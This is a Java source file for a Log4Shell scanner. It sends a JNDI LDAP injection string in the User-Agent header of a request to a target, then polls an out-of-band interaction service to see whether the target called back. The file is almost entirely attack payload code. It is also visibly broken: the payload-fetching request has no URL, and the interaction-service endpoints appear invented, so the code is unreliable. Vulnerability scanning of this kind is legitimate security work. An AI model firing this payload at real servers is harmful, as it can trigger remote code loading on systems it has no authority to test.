import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.util.EntityUtils;

public class log4jscanner {
    private static final String INTERACTSH_SERVER = "https://interact.sh";
    private static final String TARGET_URL = "http://localhost.com";

    public static void main(String[] args) {
        try {
            
            HttpClient client = HttpClients.createDefault(); 
            String oobPayload = getOOBPayload();
            HttpGet request = new HttpGet(TARGET_URL);
            request.setHeader("User-Agent", "${jndi:ldap://" + oobPayload + "/exploit}");
            HttpResponse response = client.execute(request);
            System.out.println("HTTP Response Code: " + response.getStatusLine().getStatusCode());
            System.out.println("Response Body: " + EntityUtils.toString(response.getEntity()));
    
            checkForInteractions(oobPayload);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static String getOOBPayload() throws Exception {
        HttpClient client = HttpClients.createDefault();
        HttpGet request = new HttpGet();

        HttpResponse response = client.execute(request);
        int statusCode = response.getStatusLine().getStatusCode();
        String responseBody = EntityUtils.toString(response.getEntity());

        if (statusCode == 200) {
            ObjectMapper mapper = new ObjectMapper();
            JsonNode rootNode = mapper.readTree(responseBody);
            String payloadUrl = rootNode.path("url").asText();
            return payloadUrl;
        } else {
            throw new RuntimeException("Failed to get OOB payload from Interactsh: HTTP status " + statusCode);
        }
    }

    private static void checkForInteractions(String oobPayload) {
        try {
            HttpClient client = HttpClients.createDefault();
            HttpGet request = new HttpGet(INTERACTSH_SERVER + "/interactions?payload=" + oobPayload);

            HttpResponse response = client.execute(request);
            int statusCode = response.getStatusLine().getStatusCode();
            String responseBody = EntityUtils.toString(response.getEntity());

            if (statusCode == 200) {
                System.out.println("Interactions: " + responseBody);
            } else {
                System.out.println("Failed to retrieve interactions: HTTP status " + statusCode);
            }
        } catch (Exception e) {
            e.printStackTrace();
            System.out.println("Error checking for interactions.");
        }
    }
}
